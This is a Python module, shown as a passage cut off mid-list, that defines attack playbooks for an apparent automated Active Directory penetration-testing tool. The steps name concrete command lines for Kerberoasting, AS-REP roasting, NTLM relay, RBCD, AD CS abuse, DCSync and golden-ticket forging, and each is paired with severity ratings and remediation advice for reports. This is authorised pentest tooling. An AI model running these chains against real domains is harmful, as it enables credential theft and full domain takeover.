# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Editable, persisted playbook definitions for the web console.

A playbook is a declarative description of an attack path Autopwn follows — the
AD kill chain in `chains.py`, plus web / relay side-paths. Each has:

  * ``match``  — how it is selected against scan results (ports / fact signals).
  * ``run``    — the macro tool that executes it (e.g. ad_kill_chain), so a
                 playbook can be launched as a job straight from the console.
  * ``steps``  — the ordered actions. Every step is a small data-flow node:
      - ``trigger``  : the condition that fires the step (what must be true).
      - ``tool``     : the action it runs.
      - ``consumes`` : artifacts it needs from earlier steps.
      - ``produces`` : artifacts it hands forward.
      - ``next``     : where control flows on success ("next" / "final" / a step).
      - ``branches`` : conditional re-routes ("if guest disabled → …").

    This makes each step's trigger and what it passes on explicit, which is what
    the console's step builder edits and the reader view visualises.

Defaults live in DEFAULT_PLAYBOOKS. On first use they are written to
``<log_dir>/playbooks.json``; after that the operator edits them through the UI.
`evaluate()` computes — and explains — whether a playbook matches the current
service matrix, so the matching is transparent rather than magic.
"""
from __future__ import annotations

import copy
import json
import re
from pathlib import Path


# Bump when the built-in playbooks change so existing installs re-seed them.
_BUILTIN_VERSION = 11

# Controlled vocabulary the step builder offers (free text is still allowed).
# `domain`/`signing`/`host_info` are the reconnaissance variables an early
# fingerprint step produces (and that later Kerberos steps consume).
ARTIFACTS = [
    "domain", "host_info", "signing", "userlist", "credential", "hash", "ticket",
    "spn_hash", "asrep_hash", "shares", "relay_targets", "coerced", "machine_account",
    "adcs_vuln", "certificate", "mssql_exec", "delegation", "trust", "acl_write",
    "gpp", "zerologon_vuln", "nopac_vuln", "printnightmare_vuln", "ms17_vuln",
    "admin", "flag",
]
# Execution triggers the sequence runner understands (see sequence._trigger_ok).
# A step fires when its trigger is true against the current variables.
TRIGGERS = [
    "start", "guest", "no userlist", "have userlist", "have credential",
    "have password", "have hashes", "signing disabled",
]
SIGNALS = [
    "username", "nthash", "signing_false", "guest", "has_users",
    "kerberoastable", "asreproastable",
]
NEXT_CHOICES = ["next", "final"]
SEVERITIES = ["Critical", "High", "Medium", "Low", "Info"]
# Host facts a finding playbook can match on (fact -> what it means).
HOST_FACTS = {
    "smb_signing": "'False' when SMB signing is not enforced",
    "smb_nullauth": "'True' when anonymous SMB is permitted",
    "os": "OS string harvested from the host",
    "pwned": "'Pwn3d!' when an account is admin on the host",
    "kerberoastable": "SPN hashes were obtained",
    "asreproastable": "AS-REP hashes were obtained",
}

SCHEMA = {
    "artifacts": ARTIFACTS,   # what a step can consume / produce
    "triggers": TRIGGERS,     # common step preconditions
    "signals": SIGNALS,       # fact signals usable in match / triggers
    "next": NEXT_CHOICES,
    "severities": SEVERITIES,
    "host_facts": HOST_FACTS,
    "notes": {
        "trigger": "The condition that fires this step.",
        "consumes": "Artifacts this step needs from earlier steps.",
        "produces": "Artifacts this step hands to the next / final step.",
        "next": "'next' = fall through, 'final' = goal, or a step title.",
        "severity": "Set severity+cvss to make this playbook a reportable finding.",
        "host_facts": "Match a host only when these facts equal these values.",
    },
}


def _finding(pb_id, name, severity, cvss, summary, impact, recommendation,
             any_ports=None, host_facts=None, evidence_tools=None,
             detector="", signals=None):
    """A detection/reporting playbook: when it matches the scan it becomes a
    finding in the report carrying this severity, CVSS, impact and recommendation."""
    return {
        "id": pb_id, "name": name, "category": "finding",
        "severity": severity, "cvss": cvss, "summary": summary,
        "impact": impact, "recommendation": recommendation,
        "match": {"any_ports": any_ports or [], "host_facts": host_facts or {},
                  "signals": signals or []},
        "evidence_tools": evidence_tools or [], "detector": detector,
        "run": {"tool": ""}, "steps": [],
    }


def _step(n, title, trigger, tool, consumes, produces, detail, nxt="next",
          branches=None, severity="", cvss="", impact="", recommendation="",
          finding_title="", args=None):
    # A step is one executable action: `tool` is the single built-in/catalog tool
    # it RUNS, `trigger` is when it fires, and `args` are fixed arguments for the
    # tool. The playbook's execution sequence is generated from these steps
    # (see runnable_sequence), so the tool shown on the step is the tool that runs.
    # severity (+ cvss/impact/recommendation/finding_title) additionally makes the
    # step a reportable finding when it fires (its produced artifact is evidenced).
    return {"n": n, "title": title, "trigger": trigger, "tool": tool,
            "args": args or {}, "consumes": consumes, "produces": produces,
            "detail": detail, "next": nxt, "branches": branches or [],
            "severity": severity, "cvss": cvss, "impact": impact,
            "recommendation": recommendation, "finding_title": finding_title}


# A step's tool is "runnable" (part of the execution sequence) when it names a
# single tool — not a descriptive label like "netexec_smb / netexec_rid_brute".
_DESCRIPTIVE_TOOL = re.compile(r"[\s/+,]")


def _runnable_tool(tool: str) -> bool:
    tool = (tool or "").strip()
    return bool(tool) and _DESCRIPTIVE_TOOL.search(tool) is None


def runnable_sequence(pb: dict) -> list:
    """The executable sequence for a playbook, GENERATED from its steps.

    Each step that names a single tool contributes one execution entry
    (tool + when-trigger + fixed args + label), in order. So the tool shown on a
    step in the builder is exactly the tool that runs. An explicit ``run.sequence``
    (legacy / hand-authored) still takes precedence for backward compatibility.
    """
    run = pb.get("run") or {}
    if run.get("sequence"):
        return run["sequence"]
    seq = []
    for st in pb.get("steps", []):
        tool = (st.get("tool") or "").strip()
        if not _runnable_tool(tool):
            continue
        seq.append({"tool": tool, "when": st.get("trigger", "start"),
                    "args": st.get("args") or {}, "label": st.get("title", "")})
    return seq


DEFAULT_PLAYBOOKS = [
    {
        "id": "ad-kill-chain",
        "name": "Active Directory — no/low creds → Domain Admin",
        "summary": "Guest/RID → spray → AS-REP → Kerberoast → loot → pass-the-hash. "
                   "Re-routes on what each step actually finds.",
        "match": {"any_ports": [88, 389, 445, 636, 3268], "signals": []},
        # No separate run.sequence: the executable sequence is GENERATED from the
        # steps below (each step's tool + trigger + args), so the tool shown on a
        # step is exactly the tool that runs.
        "run": {},
        "steps": [
            _step(1, "Fingerprint + null session", "start",
                  "netexec_smb", [], ["domain", "host_info", "signing"],
                  "netexec_smb against the DC to read the domain, hostname and SMB "
                  "signing over a null session. The domain it discovers is required "
                  "by the Kerberos steps (kerbrute / AS-REP / Kerberoast)."),
            _step(2, "RID-cycle the domain user list", "start",
                  "netexec_rid_brute", [], ["userlist"],
                  "RID-brute over a guest/null session to walk every domain user "
                  "(SidTypeUser) into a user list.",
                  severity="Medium", cvss="5.3",
                  finding_title="Domain User Enumeration via Null / Guest Session",
                  impact="An unauthenticated attacker can enumerate the full domain "
                         "user list (guest/null session + RID cycling), which seeds "
                         "password spraying and roasting attacks.",
                  recommendation="Disable the Guest account, restrict anonymous SID/RID "
                         "enumeration (RestrictAnonymous), and monitor for RID cycling."),
            _step(3, "User-enum fallback (hardened DC)", "no userlist",
                  "kerbrute_userenum", ["domain"], ["userlist"],
                  "When RID cycling returns nothing, enumerate valid usernames via "
                  "Kerberos pre-auth (no lockout). Needs the domain."),
            _step(4, "AS-REP roast", "have userlist",
                  "asrep_roast", ["userlist", "domain"], ["asrep_hash"],
                  "Request AS-REP hashes for accounts without Kerberos pre-auth.",
                  severity="High", cvss="7.5",
                  finding_title="AS-REP Roastable Accounts (Kerberos Pre-Authentication Disabled)",
                  impact="Accounts with Kerberos pre-authentication disabled allow an "
                         "unauthenticated attacker to request AS-REP hashes and crack "
                         "them offline, yielding domain credentials.",
                  recommendation="Enable Kerberos pre-authentication on all accounts "
                         "(remove DONT_REQ_PREAUTH) and enforce strong passwords."),
            _step(5, "Crack AS-REP hashes", "have hashes",
                  "crack_hashes", ["asrep_hash"], ["credential"],
                  "Crack the AS-REP hashes offline with john + rockyou."),
            _step(6, "Password spray (username == password)", "have userlist",
                  "netexec_spray", ["userlist"], ["credential"],
                  "One server-side batch, --no-bruteforce (one attempt per user, no "
                  "lockout): try password == username.",
                  args={"userpass": "true"},
                  severity="High", cvss="8.1",
                  finding_title="Weak or Guessable Account Passwords",
                  impact="Weak or guessable account passwords (including password equal "
                         "to the username) were accepted, giving an attacker a domain "
                         "foothold for lateral movement.",
                  recommendation="Enforce a strong password policy, block username-based "
                         "and common passwords (e.g. Azure AD Password Protection), and "
                         "enable account lockout / spray detection."),
            _step(7, "Authenticated LDAP user dump", "have credential",
                  "netexec_ldap", ["credential"], ["userlist"],
                  "With a credential, dump the complete user list over LDAP.",
                  args={"action": "--users"}),
            _step(8, "Kerberoast SPN accounts", "have credential",
                  "kerberoast", ["credential", "domain"], ["spn_hash"],
                  "GetUserSPNs for SPN accounts to request their service tickets. "
                  "Needs a credential and the domain.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberoastable Service Accounts",
                  impact="Service accounts with SPNs are Kerberoastable: any domain user "
                         "can request their service tickets and crack them offline. "
                         "Service accounts are often privileged.",
                  recommendation="Use group Managed Service Accounts (gMSA) or 25+ char "
                         "random passwords for SPN accounts, and use AES encryption."),
            _step(9, "Crack Kerberoast hashes", "have hashes",
                  "crack_hashes", ["spn_hash"], ["credential"],
                  "Crack the Kerberoast (krb5tgs) hashes offline with john + rockyou."),
            _step(10, "Password reuse spray", "have password",
                  "spray_cracked", ["credential", "userlist"], ["credential"],
                  "Spray a cracked password across all users (the user list) to "
                  "find reuse."),
            _step(11, "Loot readable shares", "have credential",
                  "smb_loot", ["credential"], ["shares", "hash"],
                  "Enumerate and flag readable non-default SMB shares (backups, "
                  "scripts, GPP cpassword, KeePass).",
                  severity="Medium", cvss="6.5",
                  finding_title="Credential Reuse and Sensitive Data on Readable Shares",
                  impact="Recovered passwords are reused across accounts and/or credential "
                         "material (NTLM hashes, GPP cpassword, backups) is exposed on "
                         "readable shares, extending compromise.",
                  recommendation="Enforce unique passwords, remove secrets from shares, "
                         "and restrict share permissions to least privilege."),
            _step(12, "Confirm access / admin", "have credential",
                  "netexec_smb", ["credential"], ["admin", "flag"],
                  "Authenticate to the DC and run whoami; watch for Pwn3d! (local "
                  "admin) — then read C$ / capture flags.", "final",
                  args={"command": "whoami"},
                  severity="Critical", cvss="9.8",
                  finding_title="Full Domain Compromise — Administrative Access to Domain Controller",
                  impact="Administrative access to a Domain Controller was achieved "
                         "(pass-the-hash / DCSync), giving full control of the domain — "
                         "all accounts, hashes and data are compromised.",
                  recommendation="Rotate krbtgt and privileged credentials, enforce "
                         "tiered administration and LAPS, restrict NTLM, and monitor for "
                         "DCSync/replication from non-DCs."),
        ],
    },
    {
        "id": "rbcd",
        "name": "RBCD to Domain Admin (write over a computer)",
        "summary": "Abuse write access to a computer's delegation attribute plus "
                   "MachineAccountQuota to impersonate an admin.",
        "match": {"any_ports": [88, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Create a machine account", "have credential", "add_computer",
                  ["credential"], ["machine_account"],
                  "Create a computer you control (default ATTACK$ / Attack123!). Succeeds "
                  "only when MachineAccountQuota > 0 — the enabling misconfiguration.",
                  severity="Medium", cvss="5.9",
                  finding_title="MachineAccountQuota Permits Computer Account Creation",
                  impact="Any authenticated user can join up to MachineAccountQuota (default "
                         "10) computers to the domain — the controlled principal needed for "
                         "RBCD and other delegation attacks.",
                  recommendation="Set ms-DS-MachineAccountQuota to 0 and delegate computer "
                         "creation to a dedicated group."),
            _step(2, "Write delegation onto the target", "have credential",
                  "rbcd (set delegate_to = target computer from BloodHound)",
                  ["credential", "machine_account"], [],
                  "impacket-rbcd -delegate-from ATTACK$ -delegate-to <TARGET$> -action write. "
                  "Needs write over the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity."),
            _step(3, "S4U2Proxy ticket + use it", "have credential",
                  "get_st (set spn + impersonate=Administrator)",
                  ["machine_account"], ["ticket", "admin", "flag"],
                  "impacket-getST -spn cifs/<target.fqdn> -impersonate Administrator → .ccache; "
                  "then KRB5CCNAME=… secretsdump -k / psexec -k for admin on the target. "
                  "This is the RBCD → Domain Admin escalation (Critical) once you have write "
                  "over the target computer — run it manually with the values from BloodHound.",
                  "final"),
        ],
    },
    {
        "id": "smb-relay",
        "name": "Coercion + NTLM relay (unsigned SMB)",
        "summary": "Coerce a DC/host to authenticate (PrinterBug/PetitPotam) and relay "
                   "that NTLM to a signing-disabled host for code exec or a secrets dump.",
        "match": {"any_ports": [445], "signals": ["signing_false"]},
        "run": {},
        "steps": [
            _step(1, "Find relay targets (unsigned SMB)", "start", "netexec_smb",
                  [], ["relay_targets", "signing"],
                  "Fingerprint SMB signing; hosts returning signing:False are relay targets "
                  "(in GOAD: CASTELBLACK .22 and BRAAVOS .23)."),
            _step(2, "Coerce authentication from a DC", "have credential", "coercer",
                  ["credential"], ["coerced"],
                  "Coerce the DC to authenticate to your listener over MS-RPRN "
                  "(PrinterBug) / MS-EFSR (PetitPotam). Provide listener = your IP.",
                  severity="High", cvss="8.1",
                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
                  impact="A DC/host can be coerced into authenticating to an arbitrary "
                         "target, feeding an NTLM relay to any unsigned host (or ADCS ESC8) "
                         "for domain compromise.",
                  recommendation="Patch MS-RPRN/MS-EFSR, disable the Print Spooler on DCs, "
                         "enforce SMB signing and EPA, and disable NTLM."),
            _step(3, "Relay to the unsigned host", "start",
                  "ntlmrelayx (run as a listener: -t smb://<target> -smb2support)",
                  ["relay_targets", "coerced"], ["hash", "admin"],
                  "Start ntlmrelayx first, then step 2 coerces auth into it; it relays to "
                  "the signing:False host for a SAM/secrets dump or command execution.",
                  "final"),
        ],
    },
    {
        "id": "web-app",
        "name": "Web application assessment",
        "summary": "Fingerprint, enumerate content, test the common classes; pivot "
                   "any recovered credential back into the network.",
        "match": {"any_ports": [80, 443, 8080, 8443, 8000], "signals": []},
        "run": {"tool": ""},
        "steps": [
            _step(1, "Fingerprint", "start", "http_probe", [], [],
                  "Server, tech stack, titles, redirects, headers."),
            _step(2, "Content discovery", "start", "ffuf / feroxbuster", [], [],
                  "Directory/vhost brute force; find admin panels, APIs, uploads."),
            _step(3, "Vulnerability scan", "start", "nuclei", [], ["credential"],
                  "Test auth, injection, SSRF, deserialization, default creds.",
                  severity="High", cvss="7.5",
                  finding_title="Exploitable Web Application Vulnerability / Default Credentials",
                  impact="The web application exposed a vulnerability or default/weak "
                         "credentials that yield a foothold.",
                  recommendation="Patch the identified issue, remove default credentials, "
                         "and apply secure configuration and input validation."),
            _step(4, "Pivot credentials", "have credential", "netexec_spray",
                  ["credential"], ["admin"],
                  "Any recovered credential → spray across the AD estate.", "final"),
        ],
    },
    {
        "id": "kerberoast-da",
        "name": "Kerberoast a service account (assumed breach)",
        "summary": "With one domain credential, roast SPN service accounts and crack "
                   "them offline — service accounts are often highly privileged.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Fingerprint the DC", "start", "netexec_smb", [],
                  ["domain", "host_info"],
                  "Read the domain from the DC (needed by GetUserSPNs)."),
            _step(2, "Kerberoast SPN accounts", "have credential", "kerberoast",
                  ["credential", "domain"], ["spn_hash"],
                  "GetUserSPNs for every SPN account and request their tickets.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberoastable Service Accounts",
                  impact="SPN service accounts can be roasted by any domain user and "
                         "cracked offline; they are frequently privileged.",
                  recommendation="Use gMSA or 25+ char random passwords for SPN accounts "
                         "and enforce AES."),
            _step(3, "Crack the tickets", "have hashes", "crack_hashes",
                  ["spn_hash"], ["credential"],
                  "Crack the krb5tgs hashes offline with john + rockyou."),
            _step(4, "Confirm the recovered account", "have credential", "netexec_smb",
                  ["credential"], ["admin", "flag"],
                  "Authenticate with the cracked service account; watch for Pwn3d!.",
                  "final", args={"command": "whoami /groups"}),
        ],
    },
    {
        "id": "adcs-esc",
        "name": "AD CS abuse (ESC escalation)",
        "summary": "Find a vulnerable certificate template and enroll a certificate as a "
                   "privileged user, then authenticate with it to recover their hash/TGT.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Find vulnerable templates", "have credential", "certipy_find",
                  ["credential", "domain"], ["adcs_vuln"],
                  "certipy find -vulnerable: enumerate CAs and flag ESC1-ESC8 templates.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS Misconfiguration (Vulnerable Certificate Template)",
                  impact="A vulnerable AD CS template lets a low-privileged user enroll a "
                         "certificate as another user (e.g. Domain Admin), leading to full "
                         "domain compromise.",
                  recommendation="Remove enrollee-supplied-subject (ESC1), restrict "
                         "enrollment rights, enable manager approval, and audit templates."),
            _step(2, "Enroll as a privileged user", "have credential",
                  "certipy_req (set ca/template/upn from step 1)",
                  ["adcs_vuln", "credential"], ["certificate"],
                  "certipy req -ca <CA> -template <ESC1> -upn administrator@<domain> → .pfx."),
            _step(3, "Authenticate with the certificate", "have credential",
                  "certipy_auth (set pfx from step 2)", ["certificate"], ["credential", "hash"],
                  "certipy auth -pfx administrator.pfx → NT hash + TGT for the target user.",
                  "final"),
        ],
    },
    {
        "id": "mssql-foothold",
        "name": "MSSQL foothold (xp_cmdshell)",
        "summary": "Authenticate to MSSQL with a domain credential and gain OS command "
                   "execution as the service account via xp_cmdshell.",
        "match": {"any_ports": [1433], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Authenticate to MSSQL", "have credential", "netexec_mssql",
                  ["credential", "domain"], [],
                  "Windows-auth to the SQL instance with a recovered domain credential."),
            _step(2, "Command execution via xp_cmdshell", "have credential",
                  "netexec_mssql", ["credential"], ["mssql_exec"],
                  "Enable and run xp_cmdshell to execute OS commands as the SQL service "
                  "account (then abuse SeImpersonate → SYSTEM).", "final",
                  args={"command": "whoami"},
                  severity="High", cvss="8.1",
                  finding_title="MSSQL Command Execution via xp_cmdshell",
                  impact="A domain credential grants SQL access that enables OS command "
                         "execution as the service account, a foothold toward SYSTEM.",
                  recommendation="Restrict SQL logins, disable xp_cmdshell, run SQL under a "
                         "low-privileged account without SeImpersonate, and patch."),
        ],
    },
    {
        "id": "domain-dominance",
        "name": "Domain dominance (DCSync → golden ticket)",
        "summary": "With a privileged credential, replicate the directory (DCSync/NTDS) "
                   "and forge a golden ticket for persistence.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "DCSync / NTDS dump", "have credential", "secretsdump",
                  ["credential"], ["hash"],
                  "Replicate secrets from the DC (SAM/LSA/NTDS incl. krbtgt).",
                  severity="Critical", cvss="9.8",
                  finding_title="Domain Credential Replication (DCSync / NTDS Dump)",
                  impact="A privileged account can replicate every domain secret "
                         "(all NT hashes incl. krbtgt) — complete domain compromise.",
                  recommendation="Restrict replication (DS-Replication-Get-Changes) to DCs, "
                         "tier admin accounts, and rotate krbtgt twice."),
            _step(2, "Forge a golden ticket", "have hashes",
                  "ticketer (set krbtgt hash + domain SID)", ["hash"], ["ticket", "admin"],
                  "ticketer -nthash <krbtgt> -domain-sid <SID> Administrator → golden TGT "
                  "for full-domain persistence.", "final"),
        ],
    },
    {
        "id": "acl-abuse",
        "name": "Abusable AD ACLs → privilege escalation",
        "summary": "Find objects your account can write (GenericAll/WriteDACL/GenericWrite/"
                   "ForceChangePassword) and abuse them: targeted Kerberoast, shadow "
                   "credentials, group add, or password reset.",
        "match": {"any_ports": [389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Collect the ACL graph (BloodHound)", "have credential",
                  "bloodhound_python", ["credential"], [],
                  "Collect users/groups/ACLs so you can see which principals your account "
                  "has dangerous rights over."),
            _step(2, "Enumerate writable objects", "have credential", "bloodyad",
                  ["credential"], ["acl_write"],
                  "bloodyAD get writable — list every object your account can modify.",
                  severity="High", cvss="8.1",
                  finding_title="Abusable Active Directory ACLs (GenericAll / WriteDACL / …)",
                  impact="The account holds dangerous write rights over other principals, "
                         "allowing takeover via targeted Kerberoast, shadow credentials, "
                         "group membership, or a password reset — often up to Domain Admin.",
                  recommendation="Audit and remove excessive ACEs (GenericAll/WriteDACL/"
                         "WriteOwner/GenericWrite/ForceChangePassword); apply least privilege "
                         "and tiering; monitor DACL changes."),
            _step(3, "Targeted Kerberoast the writable users", "have credential",
                  "targeted_kerberoast", ["acl_write", "credential"], ["spn_hash"],
                  "Set an SPN on each user you can write, roast it, then remove the SPN — "
                  "yields a crackable ticket without touching their password."),
            _step(4, "Crack the tickets", "have hashes", "crack_hashes",
                  ["spn_hash"], ["credential"],
                  "Crack the targeted-roast hashes offline.", "final"),
        ],
    },
    {
        "id": "shadow-credentials",
        "name": "Shadow Credentials (msDS-KeyCredentialLink)",
        "summary": "When you can write to a target account, add a key credential and "
                   "authenticate as it to recover its NT hash + TGT — no password reset.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Add key + authenticate (certipy shadow auto)", "have credential",
                  "certipy_shadow", ["credential"], ["certificate", "hash"],
                  "certipy shadow auto -account <target$> — adds a KeyCredential, gets the "
                  "target's NT hash/TGT via PKINIT, then removes the key.", "final",
                  severity="High", cvss="8.1",
                  finding_title="Shadow Credentials (writable msDS-KeyCredentialLink)",
                  impact="Write access to a target's msDS-KeyCredentialLink lets an attacker "
                         "add a certificate key and impersonate the account (recovering its "
                         "hash/TGT) without resetting its password.",
                  recommendation="Restrict write access to msDS-KeyCredentialLink, deploy "
                         "and enforce a strong Key Trust / ADCS configuration, and monitor "
                         "KeyCredentialLink changes."),
        ],
    },
    {
        "id": "delegation-abuse",
        "name": "Kerberos delegation abuse",
        "summary": "Enumerate unconstrained / constrained / RBCD delegation and abuse it to "
                   "impersonate a privileged user (S4U2Self/Proxy) up to Domain Admin.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate delegation", "have credential", "finddelegation",
                  ["credential"], ["delegation"],
                  "findDelegation: list accounts with unconstrained, constrained "
                  "(AllowedToDelegate) or resource-based delegation.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberos Delegation Misconfiguration",
                  impact="Accounts with unconstrained/constrained/RBCD delegation can be "
                         "abused to impersonate any user (including Domain Admins) to the "
                         "delegated services, leading to domain compromise.",
                  recommendation="Remove unconstrained delegation; scope constrained "
                         "delegation tightly; restrict who can write "
                         "msDS-AllowedToActOnBehalfOfOtherIdentity; mark admins 'sensitive, "
                         "cannot be delegated' and add them to Protected Users."),
            _step(2, "Impersonate via S4U (constrained/RBCD)", "have credential",
                  "get_st (set spn + impersonate=Administrator)", ["delegation"],
                  ["ticket", "admin"],
                  "getST -spn <svc/target> -impersonate Administrator → .ccache; for "
                  "unconstrained, coerce a DC to the delegation host and extract its TGT.",
                  "final"),
        ],
    },
    {
        "id": "trust-abuse",
        "name": "Domain / forest trust abuse",
        "summary": "Enumerate trusts, then escalate child→parent (or across a forest trust) "
                   "with an inter-realm ticket carrying the parent Enterprise Admins SID.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate domain/forest trusts", "have credential",
                  "netexec_ldap", ["credential"], ["trust"],
                  "LDAP query for trustedDomain objects — map parent/child and cross-forest "
                  "trusts and their attributes/direction.",
                  args={"action": "--query (objectClass=trustedDomain) *"},
                  severity="Medium", cvss="6.5",
                  finding_title="Abusable Domain / Forest Trust",
                  impact="An intra-forest (child→parent) trust — and a forest trust without "
                         "SID filtering — lets a child Domain Admin escalate to Enterprise "
                         "Admin / the trusting forest via SID history in a forged ticket.",
                  recommendation="Enable SID filtering / quarantine on trusts, treat the "
                         "forest (not the domain) as the security boundary, and tier admins."),
            _step(2, "Get the domain SID", "have credential", "lookupsid",
                  ["credential"], [],
                  "lookupsid → the domain SID needed to forge the inter-realm ticket."),
            _step(3, "Child → parent (extra-SID golden ticket)", "have credential",
                  "raisechild (or ticketer -extra-sid <parent>-519)",
                  ["hash", "trust"], ["ticket", "admin", "flag"],
                  "From child DA: dump child krbtgt, forge a TGT with the parent Enterprise "
                  "Admins SID (…-519) — Enterprise Admin on the forest root.", "final"),
        ],
    },
    {
        "id": "creds-in-ad",
        "name": "Credentials exposed in AD (GPP / description / LAPS)",
        "summary": "Harvest credentials that live in the directory: GPP cpassword in SYSVOL, "
                   "passwords in user description fields, and readable LAPS passwords.",
        "match": {"any_ports": [389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "GPP cpassword in SYSVOL", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc smb -M gpp_password: decrypt cached Group Policy Preference passwords "
                  "from SYSVOL (AES key is public).", args={"protocol": "smb", "module": "gpp_password"},
                  severity="High", cvss="7.5",
                  finding_title="Credentials Exposed in AD (GPP / description / LAPS)",
                  impact="Reusable credentials are stored in the directory (GPP cpassword, "
                         "user description fields, or LAPS readable by too many principals), "
                         "recoverable by any domain user.",
                  recommendation="Remove GPP passwords (KB2962486), never store secrets in "
                         "description fields, and restrict LAPS read rights to admins."),
            _step(2, "Passwords in description fields", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M get-desc-users: dump user description fields (often hold "
                  "passwords).", args={"protocol": "ldap", "module": "get-desc-users"}),
            _step(3, "Readable LAPS passwords", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M laps: read LAPS local-admin passwords your account can see.",
                  "final", args={"protocol": "ldap", "module": "laps"}),
        ],
    },
    {
        "id": "privesc-ad",
        "name": "AD privilege escalation — map every path (authenticated user)",
        "summary": "From ONE unprivileged domain credential, enumerate and surface every "
                   "escalation path: Kerberoast, AS-REP, abusable ACLs, delegation, AD CS "
                   "(ESC), and credentials stored in the directory (GPP/description/LAPS).",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate the full user list", "have credential", "netexec_ldap",
                  ["credential"], ["userlist"],
                  "Authenticated LDAP dump of every domain user (feeds AS-REP roasting).",
                  args={"action": "--users"}),
            _step(2, "Collect the ACL / attack graph", "have credential",
                  "bloodhound_python", ["credential"], [],
                  "Collect users/groups/ACLs/sessions/trusts so every escalation edge from "
                  "this user is visible in BloodHound."),
            _step(3, "Kerberoastable service accounts", "have credential", "kerberoast",
                  ["credential", "domain"], ["spn_hash"],
                  "Roast SPN accounts — often privileged.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberoastable Service Accounts",
                  impact="SPN service accounts can be roasted by any domain user and cracked "
                         "offline; they are frequently privileged.",
                  recommendation="Use gMSA or 25+ char random passwords for SPN accounts."),
            _step(4, "AS-REP roastable accounts", "have userlist", "asrep_roast",
                  ["userlist", "domain"], ["asrep_hash"],
                  "Roast accounts without Kerberos pre-auth (crackable, no creds needed).",
                  severity="High", cvss="7.5",
                  finding_title="AS-REP Roastable Accounts (Kerberos Pre-Authentication Disabled)",
                  impact="Accounts with pre-auth disabled yield crackable AS-REP hashes.",
                  recommendation="Enable Kerberos pre-authentication on all accounts."),
            _step(5, "Abusable ACLs over other principals", "have credential", "bloodyad",
                  ["credential"], ["acl_write"],
                  "bloodyAD get writable — objects this user can modify (GenericAll/WriteDACL/"
                  "GenericWrite/ForceChangePassword → takeover).",
                  severity="High", cvss="8.1",
                  finding_title="Abusable Active Directory ACLs (GenericAll / WriteDACL / …)",
                  impact="Dangerous write rights over other principals allow takeover via "
                         "targeted Kerberoast, shadow credentials, group add, or password reset.",
                  recommendation="Audit and remove excessive ACEs; apply least privilege and tiering."),
            _step(6, "Kerberos delegation", "have credential", "finddelegation",
                  ["credential"], ["delegation"],
                  "Unconstrained / constrained / RBCD delegation abusable to impersonate admins.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberos Delegation Misconfiguration",
                  impact="Delegation lets an account impersonate any user (incl. Domain Admins) "
                         "to the delegated services.",
                  recommendation="Remove unconstrained delegation; scope constrained tightly; "
                         "protect admins (sensitive/Protected Users)."),
            _step(7, "AD CS vulnerable templates (ESC)", "have credential", "certipy_find",
                  ["credential", "domain"], ["adcs_vuln"],
                  "certipy find -vulnerable: ESC1-ESC8 templates enrollable as a privileged user.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS Misconfiguration (Vulnerable Certificate Template)",
                  impact="A vulnerable AD CS template lets a low-priv user enroll a certificate "
                         "as Domain Admin — full domain compromise.",
                  recommendation="Remove enrollee-supplied-subject (ESC1), restrict enrollment, "
                         "enable manager approval, and audit templates."),
            _step(8, "Credentials stored in the directory (GPP)", "have credential",
                  "netexec_module", ["credential"], ["gpp"],
                  "GPP cpassword cached in SYSVOL (the AES key is public).",
                  args={"protocol": "smb", "module": "gpp_password"},
                  severity="High", cvss="7.5",
                  finding_title="Credentials Exposed in AD (GPP / description / LAPS)",
                  impact="Reusable credentials are stored in the directory (GPP cpassword, "
                         "description fields, or over-readable LAPS).",
                  recommendation="Remove GPP passwords (KB2962486), never store secrets in "
                         "description fields, restrict LAPS read rights."),
            _step(9, "Passwords in description fields", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M get-desc-users: user description fields often hold passwords.",
                  args={"protocol": "ldap", "module": "get-desc-users"}),
            _step(10, "Readable LAPS passwords", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M laps: LAPS local-admin passwords your account can read.",
                  args={"protocol": "ldap", "module": "laps"}),
            _step(11, "Crack what you roasted", "have hashes", "crack_hashes",
                  ["spn_hash", "asrep_hash"], ["credential"],
                  "Crack the AS-REP / Kerberoast hashes offline → a more privileged credential.",
                  "final"),
        ],
    },
    {
        "id": "privesc-local",
        "name": "Local Windows privilege escalation → SYSTEM",
        "summary": "From code execution on a host (e.g. an MSSQL service account or a shell), "
                   "escalate to SYSTEM via SeImpersonate (potato), service misconfigurations, "
                   "or stored credentials.",
        "match": {"any_ports": [445, 3389, 5985, 1433], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Host privilege & config triage", "have credential",
                  "winPEAS / Seatbelt (upload + run on the host)", ["credential"], [],
                  "Once you have a shell (evil-winrm as a local admin, or an MSSQL "
                  "xp_cmdshell foothold), run winPEAS/Seatbelt: token privileges, services, "
